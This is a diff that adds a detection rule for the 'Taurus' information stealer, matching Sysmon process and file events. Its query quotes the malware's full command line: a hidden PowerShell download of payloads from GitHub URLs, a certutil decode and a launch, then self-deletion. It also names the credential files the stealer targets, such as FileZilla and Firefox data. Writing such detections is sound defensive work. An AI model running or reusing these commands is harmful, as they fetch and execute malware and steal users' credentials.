@@ -1,0 +1,30 @@
+name: Taurus
+description: |
+  'A new stealer from the Predator the Thief cybercriminal group, dubbed "Taurus" by Zscaler, is being sold tothreat actors on the dark web. It is capable of gathering large amounts of sensitive information from victim hosts.'
+severity: High
+enabled: false
+requiredDataConnectors:
+  - connectorId: Sysmon
+    dataTypes:
+      - Sysmon
+queryFrequency: 5m
+queryPeriod: 5m
+suppressionDuration: 5m
+triggerOperator: gt
+triggerThreshold: 0
+incidentConfiguration:
+  createIncident: true
+  groupingConfiguration: 
+    enabled: True
+    reopenClosedIncident: False
+    lookbackDuration: 5h
+    entitiesMatchingMethod: all
+    groupByEntities:
+tactics:
+  - DefenseEvasion
+  - Execution
+relevantTechniques:
+  - T1064
+  - T1086
+query: |
+  Sysmon | where (((CommandLine == "powershell -windowstyle hidden -e Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/leroybishop/cterka/master/GeTNht.com,https://raw.githubusercontent.com/leroybishop/cterka/master/bAMI.com,https://raw.githubusercontent.com/leroybishop/cterka/master/wsNcf.com -Destination \\\"$env:TEMP\\j2tyq.com\\\",\\\"$env:TEMP\\st6zh\\\",\\\"$env:TEMP\\wsNcf.com\\\"; Set-Location -Path \\\"$env:TEMP\\\"; certutil -decode st6zh 5pfwt;  Start-Process j2tyq -ArgumentList 5pfwt" or CommandLine == "\\\"C:\\Windows\\system32\\certutil.exe\\\" -decode st6zh 5pfw" or CommandLine == "\\\"C:\\Windows\\system32\\cmd.exe\\\" /c ping 127.0.0.1 && del \\\"C:\\Windows\\system32\\dllhost.exe\\\"") and (EventID == 1)) or ((EventID == 11) and (Image matches regex "(?i).*\\.*\\dllhost.exe") and (TargetFileName matches regex "(?i)C:\\Users\\\\.*\\AppData\\Roaming\\.purple\\accounts.xml" or TargetFileName matches regex "(?i)C:\\Users\\\\.*\\AppData\\Roaming\\Psi\\profiles\\default\\accounts.xml" or TargetFileName matches regex "(?i)C:\\Users\\\\.*\\AppData\\Roaming\\FileZilla\\sitemanager.xml" or TargetFileName matches regex "(?i)C:\\Users\\\\.*\\AppData\\Roaming\\FileZilla\\\\.*" or TargetFileName matches regex "(?i)C:\\Users\\\\.*\\AppData\\Roaming\\Mozilla\\Firefox\\\\.*")) or (hash == "ECCD93CFA03A1F1F4B2AF649ADCCEB97" or hash == "3E08E18CCC55B17EEAEEDF3864ABCA78" or hash == "221BBAC7C895453E973E47F9BCE5BFDC" or hash == "5E3EA2152589DF8AE64BA4CBB0B2BD3B"))
